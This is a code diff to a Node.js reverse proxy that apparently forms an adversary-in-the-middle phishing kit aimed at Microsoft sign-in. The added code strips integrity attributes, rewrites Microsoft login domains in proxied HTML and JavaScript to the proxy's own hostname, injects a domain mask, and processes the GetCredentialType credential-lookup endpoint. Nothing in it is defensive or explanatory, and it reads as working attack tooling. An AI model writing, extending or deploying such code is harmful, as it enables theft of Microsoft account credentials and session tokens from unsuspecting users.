@@ -655,20 +655,41 @@ const caption =
         html = html.replace(/<script[^>]+\s+integrity="[^"]*"/g, '<script');
         html = html.replace(/<link[^>]+\s+integrity="[^"]*"/g, '<link');
         html = html.replace(/integrity\s*=\s*"[^"]*"/g, '');
-        const cleanedBuffer = Buffer.from(html);
 
-        // ---- STATIC injection (original method) ----
-        serverResponseBody = updateHTMLProxyResponse(cleanedBuffer);
+        // ---- STEP 2: Rewrite all Microsoft domains in the entire HTML (inline scripts + attributes) ----
+        const domains = ['login.microsoftonline.com', 'microsoftonline.com', 'login.windows.net', 'login.microsoft.com', 'sts.microsoftonline.com'];
+        for (const domain of domains) {
+            const regex = new RegExp(`(https?:)?//${domain.replace(/\./g, '\\.')}`, 'g');
+            html = html.replace(regex, `https://${proxyHostname}`);
+        }
+        const rewrittenHtmlBuffer = Buffer.from(html, 'utf8');
+
+        // ---- STEP 1: Inject domain mask (this runs after rewriting, mask is first) ----
+        serverResponseBody = updateHTMLProxyResponse(rewrittenHtmlBuffer);
         serverResponseBody = await compressResponseBody(serverResponseBody, encodings);
 
         if (proxyResponse.headers["content-length"]) {
             proxyResponse.headers["content-length"] = Buffer.byteLength(serverResponseBody).toString();
         }
-    }
-    catch (error) {
+    } catch (error) {
         displayError("Server response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
     }
 }
+                    
+ else if (proxyResponse.headers["content-type"] && /(javascript|ecmascript)/i.test(proxyResponse.headers["content-type"]) && Buffer.byteLength(serverResponseBody)) {
+    try {
+        const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
+        const rewritten = updateJavaScriptResponse(decompressedResponseBody, proxyHostname);
+        serverResponseBody = await compressResponseBody(rewritten, encodings);
+        if (proxyResponse.headers["content-length"]) {
+            proxyResponse.headers["content-length"] = Buffer.byteLength(serverResponseBody).toString();
+        }
+    } catch (error) {
+        displayError("JavaScript processing failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path);
+    }
+    }
+    
+
                 else if (proxyRequestOptions.path.startsWith("/common/GetCredentialType")) {
                     try {
                         const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
@@ -1282,6 +1303,40 @@ async function compressResponseBody(decompressedData, encodings) {
         compressedData = await compressData(compressedData, encoding);
     }
     return compressedData;
+}
+
+// ==================== JavaScript Rewriting ====================
+function updateJavaScriptResponse(bodyBuffer, proxyHostname) {
+    // We assume the response body is either a UTF-8 string or binary;
+    // for JS files, we treat as UTF-8.
+    let jsContent = bodyBuffer.toString('utf8');
+
+    // List of Microsoft domains that commonly appear in JS
+    const microsoftDomains = [
+        'login.microsoftonline.com',
+        'microsoftonline.com',
+        'login.windows.net',
+        'login.microsoft.com',
+        'sts.microsoftonline.com'
+    ];
+
+    // Replace each domain with the proxy hostname
+    for (const domain of microsoftDomains) {
+        // Replace https://domain, http://domain, //domain
+        const regex = new RegExp(`(https?:)?//${domain.replace(/\./g, '\\.')}`, 'g');
+        jsContent = jsContent.replace(regex, (match, protocol) => {
+            // If protocol is present, keep it; but we want to use the proxy's scheme (typically https)
+            // To maintain relative-ness, we can replace with '//' + proxyHostname
+            // Or explicitly use https://proxyHostname
+            return `https://${proxyHostname}`; // force HTTPS
+        });
+    }
+
+    // Also replace any absolute paths that start with /common/ etc. (if they are used without domain)
+    // In some scripts, they may use relative paths, but we keep them as is.
+
+    // Return as Buffer
+    return Buffer.from(jsContent, 'utf8');
 }
 
 // ---- updateHTMLProxyResponse is no longer used – we replaced it with dynamic injection ----
